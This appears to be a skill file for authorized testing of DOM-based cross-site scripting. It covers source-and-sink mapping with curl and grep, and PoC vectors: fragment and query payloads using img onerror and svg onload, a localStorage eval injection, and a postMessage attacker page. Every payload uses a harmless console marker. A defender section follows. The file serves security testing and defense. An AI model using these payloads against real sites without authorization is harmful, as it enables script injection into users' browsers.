---
name: xss-dom
description: Use when testing for DOM-based cross-site scripting on an
  authorized engagement, where JavaScript on the page unsafely handles
  attacker-controlled data. Covers source and sink mapping in client-side
  code, dangerous sinks like innerHTML and eval, fragment and postMessage
  vectors, and browser-based confirmation. Use when the page reads location,
  hash, or storage into the DOM, when static HTML shows no reflection but
  the page behaves oddly, or when auditing JavaScript for client-side
  injection.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-xss
requires: [web-xss]
extends: []
relates: [web-sqli]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
  - name: curl
    version: 8.5
---

DOM-based XSS never touches the server: JavaScript reads attacker-controlled
data (the URL fragment, `postMessage`, `localStorage`) and writes it into a
dangerous sink (`innerHTML`, `eval`, `document.write`). Server-side scanners
miss it entirely, which makes manual source-to-sink tracing the core skill.
This sub-skill covers mapping DOM XSS on authorized tests: finding sources
and sinks in client-side code, building fragment vectors, and confirming
execution in a real browser.

## Quick Workflow

1. Collect the page's JavaScript: inline scripts and every linked file.
2. Mark sources: `location.hash`, `location.search`, `document.referrer`,
   `postMessage` handlers, `localStorage`, `sessionStorage`.
3. Mark sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`,
   `setTimeout` with strings, `location` assignment, jQuery `.html()`.
4. Trace each source to each sink and note any sanitization in between.
5. Build a fragment or query vector that reaches the sink.
6. Confirm in a real browser with a harmless marker.
7. Record the source, the sink, the code path, and the PoC URL.

## 1. Source and sink mapping

```bash
# Download the page and its scripts for offline review
curl -s 'https://target.example/app' -o /tmp/app.html
grep -o 'src="[^"]*\.js"' /tmp/app.html | head -20

# Quick source and sink grep over saved JavaScript
grep -n -E 'location\.(hash|search)|document\.referrer|postMessage|localStorage' /tmp/app.js
grep -n -E 'innerHTML|outerHTML|document\.write|eval\(|setTimeout\(' /tmp/app.js

# Look for the dangerous pattern: source flowing into sink
# Example find:
#   var name = location.hash.slice(1);
#   document.getElementById('greet').innerHTML = 'Hi ' + name;
```

In the browser, use DevTools: set a DOM breakpoint on subtree modification
of the target element, then load the fragment vector and watch the exact
code path that fires.

## 2. Fragment vectors

The fragment (`#...`) never reaches the server, so server logs stay clean
and the payload lives only in the victim's browser.

```bash
# Sink: element.innerHTML = location.hash.slice(1)
# PoC URL:
# https://target.example/app#<img src=x onerror=console.log('dom')>

# Sink: document.write(location.search)
# PoC URL:
# https://target.example/app?x=<svg onload=console.log('dom')>

# Sink: eval of a stored value
# localStorage.setItem('theme', "');console.log('dom');//") then reload
python3 - <<'EOF'
# Build the PoC URL safely
import urllib.parse
frag = "<img src=x onerror=console.log('dom')>"
print("https://target.example/app#" + urllib.parse.quote(frag))
EOF
```

Confirm by loading the URL in a test browser and checking for the marker
(title change or console message). curl alone can never confirm DOM XSS.

## 3. postMessage sinks

```javascript
// Vulnerable pattern to look for:
window.addEventListener('message', function(e) {
  document.getElementById('panel').innerHTML = e.data; // no origin check
});
```

```bash
# PoC: an attacker page that messages the target
cat > /tmp/poc.html <<'EOF'
<iframe src="https://target.example/app"></iframe>
<script>
window.onload = () => {
  frames[0].postMessage("<img src=x onerror=console.log('pm')>", "*");
};
</script>
EOF
echo "Open /tmp/poc.html in a test browser"
```

Check the origin validation: `if (e.origin !== 'https://target.example')`
kills this vector, while no check or a substring check keeps it alive. Note
the exact validation in your report either way.

## Edge cases

- The sink is reached only after client-side routing. Single-page apps
  parse the fragment with their own router; test the vector against the
  routed view, not the landing page.
- A sanitizer sits between source and sink. Identify it (DOMPurify,
  custom regex) and test its known bypasses one at a time instead of
  assuming it holds.
- The vulnerable code loads only for certain users or locales. Enumerate
  script variants by role and pick the one with the weakest handling.
- jQuery or framework sinks behave differently. `$().html()` is a sink,
  `$().text()` is not; Angular and React auto-escape unless the code uses
  `bypassSecurityTrustHtml` or `dangerouslySetInnerHTML`, which are the
  real targets.

## Escalation

- Static analysis finds no source-to-sink path: drive the page in a real
  browser with the fragment set and watch DevTools; dynamically injected
  scripts and event handlers hide from grep.
- The sink needs a specific application state: script the state setup
  (log in, add an item, navigate) before delivering the fragment, and
  document the full chain.
- You need impact beyond a marker: with permission, demonstrate reading
  `document.cookie` in the console; do not build exfiltration without
  written approval.
- The finding is in third-party script: verify the script is actually
  loaded by the target (not a leftover reference) and note the supply
  chain angle.

## Detection and defender view

Defenders rarely see DOM XSS in server logs because the payload never
leaves the browser; discovery usually comes from code review, bug reports,
or client-side monitoring. postMessage vectors may show the attacker's
referrer in logs. Durable defense is safe sink usage (`textContent`
instead of `innerHTML`, no `eval`), strict origin checks on every
`message` handler, DOMPurify on any HTML that must be injected, and
Content Security Policy as a backstop.

## Key references

- CWE-79 (Improper Neutralization of Input During Web Page Generation,
  Cross-site Scripting).
- OWASP Testing Guide: Testing for DOM-based Cross Site Scripting
  (OTG-CLIENT-001).
- PortSwigger Web Security Academy: DOM XSS labs and cheat sheet.
- DOMPurify documentation for safe HTML sanitization reference.
